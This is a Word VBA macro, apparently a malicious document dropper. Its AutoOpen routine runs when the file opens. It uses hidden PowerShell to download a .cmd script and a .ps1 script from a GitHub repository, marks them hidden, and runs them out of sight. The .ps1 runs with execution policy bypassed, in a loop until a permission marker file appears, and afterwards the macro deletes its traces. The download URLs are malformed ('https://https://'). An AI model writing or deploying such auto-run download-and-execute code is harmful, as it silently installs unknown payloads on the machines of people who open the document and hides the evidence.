Sub AutoOpen()
    Dim docPath As String
    Dim initialCmdPath As String
    Dim extractPs1Path As String
    Dim permTxtPath As String
    Dim shellCmdInitial As String
    Dim shellCmdExtract As String
    Dim fso As Object
    Dim tempFolder As String
    Dim startTime As Single
    Dim permissionGranted As Boolean
    Dim retryCount As Integer
    Dim maxRetries As Integer

    ' Define the maximum number of retries to prevent an infinite loop
    maxRetries = 10
    
    ' Get the path to the current document's folder
    docPath = ThisDocument.Path
    If docPath = "" Then
        Exit Sub
    End If

    ' Define the paths for initial.cmd and extract.ps1
    initialCmdPath = docPath & "\initial.cmd"
    extractPs1Path = docPath & "\extract.ps1"

    ' Get the temp directory path using FileSystemObject
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = fso.GetSpecialFolder(2) ' Temporary Folder
    permTxtPath = tempFolder & "\perm.txt"

    ' Construct the PowerShell commands to download the files (Script 2's approach but with Script 1's robustness)
    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'https://https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/l3.cmd' -OutFile '" & initialCmdPath & "'"""
    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Extract.ps1' -OutFile '" & extractPs1Path & "'"""

    ' Execute the PowerShell commands to download the files
    Shell shellCmdInitial, vbHide
    Shell shellCmdExtract, vbHide

    ' Wait for 30 seconds to ensure both files are downloaded
    startTime = Timer
    Do While Timer < startTime + 30
        DoEvents
    Loop

    ' Check if initial.cmd was successfully downloaded
    If Dir(initialCmdPath) <> "" Then
        ' Hide initial.cmd
        SetAttr initialCmdPath, vbHidden

        ' Execute initial.cmd with a hidden window
        Shell "cmd.exe /C """ & initialCmdPath & """", vbHide

        ' Wait for 10 seconds to ensure initial.cmd execution completes
        startTime = Timer
        Do While Timer < startTime + 10
            DoEvents
        Loop
    Else
        Exit Sub
    End If

    ' Check if extract.ps1 was successfully downloaded
    If Dir(extractPs1Path) <> "" Then
        ' Hide extract.ps1
        SetAttr extractPs1Path, vbHidden

        ' Run extract.ps1 in a loop until permissions are granted or maximum retries are reached
        permissionGranted = False
        retryCount = 0
        Do While Not permissionGranted And retryCount < maxRetries
            retryCount = retryCount + 1
            Shell "powershell -ExecutionPolicy Bypass -File """ & extractPs1Path & """", vbHide

            ' Check if perm.txt exists in the temporary directory
            If Dir(permTxtPath) <> "" Then
                permissionGranted = True
            End If

            ' Wait for a few seconds before retrying
            startTime = Timer
            Do While Timer < startTime + 5
                DoEvents
            Loop
        Loop

        If Not permissionGranted Then
            Exit Sub
        End If

        ' Wait for 10 seconds to ensure extract.ps1 execution completes
        startTime = Timer
        Do While Timer < startTime + 10
            DoEvents
        Loop
    Else
        Exit Sub
    End If

    ' Cleanup: Delete temporary files (Script 1's approach)
    On Error Resume Next
    fso.DeleteFile initialCmdPath, True
    fso.DeleteFile extractPs1Path, True
    fso.DeleteFile permTxtPath, True
    On Error GoTo 0
End Sub


